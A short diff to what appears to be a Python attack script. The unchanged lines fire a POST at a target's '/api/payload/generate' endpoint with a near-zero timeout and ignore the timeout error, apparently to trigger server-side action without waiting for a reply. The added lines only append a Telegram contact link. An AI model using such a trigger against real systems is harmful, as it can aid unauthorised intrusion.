@@ -184,3 +184,6 @@ try:
 	s.post(f'{url}/api/payload/generate', headers=headers, data=data, stream=True, timeout=0.0000000000001)
 except requests.exceptions.ReadTimeout:
 	pass
+
+### Telegram :
+Link : https://t.me/neverstare
